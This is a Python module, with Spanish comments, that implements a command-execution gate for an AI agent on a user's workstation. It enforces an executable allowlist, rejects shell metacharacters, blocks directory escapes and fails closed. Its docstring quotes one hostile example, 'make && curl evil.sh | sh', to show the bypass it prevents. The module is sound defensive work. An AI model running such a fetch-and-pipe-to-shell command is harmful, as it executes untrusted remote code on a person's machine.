"""El gate de ejecución local — Requisito 2.

**Por qué existe.** La contención de ficheros no restringe la ejecución de comandos —
la documentación de Anthropic lo dice literal—, así que en la superficie 3a la lista
blanca **es** toda la historia de seguridad. Si se puede ampliar en caliente, no vale
nada.

De ahí el reparto que decidió `[[10-decisiones]]` §2.7 el 2026-09-09:

* **El ejecutable nunca entra en caliente.** Ausente de la lista → denegado, y **no**
  se ofrece como decisión aprobable. Entra por la consola, por una persona y fuera del
  turno.
* **Los argumentos sí se aprueban en el turno**, pero solo de un ejecutable ya
  permitido, y con la aprobación durable de la plataforma (§IV).
* **Metacaracteres fuera.** Sin esto la lista se sortea en una línea: ``make && curl
  evil.sh | sh`` pasaría por «make». Por eso se comprueba **cada elemento** y por eso
  ``args`` es una lista y nunca una cadena.
* **Fail-closed.** Lo que no se puede verificar se deniega, y una llamada que no se
  pudo comprobar nunca es una llamada pendiente de un «sí».
"""

from __future__ import annotations

import json
import uuid
from collections.abc import Sequence
from dataclasses import dataclass
from typing import Literal

from sqlalchemy.ext.asyncio import AsyncSession

from nexus_api.db.models.local_workstation import (
    DENIAL_DISPOSITIVO_AUSENTE,
    DENIAL_EJECUTABLE_NO_PERMITIDO,
    DENIAL_FUERA_DEL_DIRECTORIO,
    DENIAL_METACARACTERES,
)
from nexus_api.repositories.local_workstation import (
    LocalArgumentGrantRepository,
    LocalExecutableRepository,
)

#: Todo lo que un shell interpretaría. La lista es deliberadamente amplia: el coste de
#: rechazar un argumento inocente es que una persona lo apruebe; el de aceptar uno
#: peligroso es un comando arbitrario en el portátil de alguien.
SHELL_METACHARACTERS = frozenset("|&;<>$`()\n\r")

Outcome = Literal["permitida", "requiere_aprobacion", "denegada"]


@dataclass(frozen=True)
class GateDecision:
    """Lo que el gate decide. ``denegada`` **nunca** es aprobable desde el turno."""

    outcome: Outcome
    #: Verbatim, lo que se intentó — la auditoría pregunta eso, no qué se permitía.
    executable: str = ""
    denial_reason: str | None = None
    executable_id: uuid.UUID | None = None
    grant_id: uuid.UUID | None = None
    argv_signature: str = ""

    @property
    def is_approvable(self) -> bool:
        return self.outcome == "requiere_aprobacion"


def contains_shell_metacharacters(value: str) -> bool:
    """¿Interpretaría un shell algo de esto? Se aplica al ejecutable y a cada argumento."""
    return any(ch in SHELL_METACHARACTERS for ch in value)


def argv_signature(args: Sequence[str]) -> str:
    """Forma canónica de los argumentos, para poder comparar dos invocaciones.

    JSON compacto y no una concatenación: ``["a b"]`` y ``["a", "b"]`` son
    invocaciones distintas y tienen que firmar distinto, o una aprobación valdría para
    la otra.
    """
    return json.dumps(list(args), ensure_ascii=False, separators=(",", ":"))


def _escapes_workdir(cwd_relative: str | None) -> bool:
    if cwd_relative is None or cwd_relative == "":
        return False
    if cwd_relative.startswith("/") or cwd_relative.startswith("~"):
        return True
    return ".." in cwd_relative.split("/")


class LocalExecGate:
    """Evalúa una invocación local antes de que se ejecute nada."""

    def __init__(self, session: AsyncSession) -> None:
        self._executables = LocalExecutableRepository(session)
        self._grants = LocalArgumentGrantRepository(session)

    async def evaluate(
        self,
        *,
        executable: str,
        args: Sequence[str],
        cwd_relative: str | None = None,
        device_present: bool = True,
    ) -> GateDecision:
        signature = argv_signature(args)

        if not device_present:
            return GateDecision(
                "denegada",
                executable=executable,
                denial_reason=DENIAL_DISPOSITIVO_AUSENTE,
                argv_signature=signature,
            )

        if contains_shell_metacharacters(executable) or any(
            contains_shell_metacharacters(a) for a in args
        ):
            # Antes que la lista blanca a propósito: da igual que el ejecutable esté
            # permitido si la invocación lleva un shell dentro.
            return GateDecision(
                "denegada",
                executable=executable,
                denial_reason=DENIAL_METACARACTERES,
                argv_signature=signature,
            )

        if _escapes_workdir(cwd_relative):
            return GateDecision(
                "denegada",
                executable=executable,
                denial_reason=DENIAL_FUERA_DEL_DIRECTORIO,
                argv_signature=signature,
            )

        allowed = await self._executables.find_active(executable)
        if allowed is None:
            # Denegada, NO aprobable: ampliar la lista es un acto de la consola.
            return GateDecision(
                "denegada",
                executable=executable,
                denial_reason=DENIAL_EJECUTABLE_NO_PERMITIDO,
                argv_signature=signature,
            )

        grant = await self._grants.find_active(executable_id=allowed.id, argv_signature=signature)
        if grant is not None:
            return GateDecision(
                "permitida",
                executable=executable,
                executable_id=allowed.id,
                grant_id=grant.id,
                argv_signature=signature,
            )

        return GateDecision(
            "requiere_aprobacion",
            executable=executable,
            executable_id=allowed.id,
            argv_signature=signature,
        )


__all__ = [
    "SHELL_METACHARACTERS",
    "GateDecision",
    "LocalExecGate",
    "Outcome",
    "argv_signature",
    "contains_shell_metacharacters",
]
